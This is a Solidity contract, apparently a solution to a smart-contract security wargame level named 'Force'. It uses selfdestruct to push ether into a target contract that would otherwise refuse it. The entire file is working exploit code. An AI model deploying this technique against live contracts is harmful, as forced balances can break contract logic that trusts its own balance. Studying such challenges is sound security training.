// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        /*
            Function "selfdestruct" deletes a contract from the blockchain
            and sends all remain Ether stored in the contract to another address.
        */
        address payable victim = payable(address(contractAddress));
        selfdestruct(victim);
    }
}
